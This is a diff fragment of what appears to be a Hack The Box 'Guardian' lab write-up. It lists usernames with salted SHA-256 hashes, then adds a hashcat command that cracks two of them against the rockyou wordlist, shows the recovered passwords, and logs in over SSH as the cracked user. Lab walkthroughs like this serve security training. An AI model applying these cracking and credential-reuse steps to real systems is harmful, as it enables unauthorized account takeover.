@@ -522,5 +522,18 @@ crin.hambidge:9b6e003386cd1e24c97661ab4ad2c94cc844789b3916f681ea39c1cbf13c8c75:8
 myra.galsworthy:ba227588efcb86dcf426c5d5c1e2aae58d695d53a1a795b234202ae286da2ef4:8Sb)tM1vs1SS
 mireielle.feek:18448ce8838aab26600b0a995dfebd79cc355254283702426d1056ca6f5d68b3:8Sb)tM1vs1SS
 vivie.smallthwaite:b88ac7727aaa9073aa735ee33ba84a3bdd26249fc0e59e7110d5bcdb4da4031a:8Sb)tM1vs1SS
+```
 
 ```
+Hexada@hexada ~/pentest-env/htb/vrm/Guardian.htb$ hashcat -m 1410 hashes_hashcat.txt /home/Hexada/pentest-env/pentesting-wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt --username -O -w 3
+
+jamil - c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250:8Sb)tM1vs1SS:copperhouse56
+admin - 694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6:8Sb)tM1vs1SS:fakebake000
+```
+
+```
+Hexada@hexada ~/pentest-env/htb/vrm/Guardian.htb$ ssh jamil@10.10.11.84  
+
+jamil@guardian:~$ 
+```
+
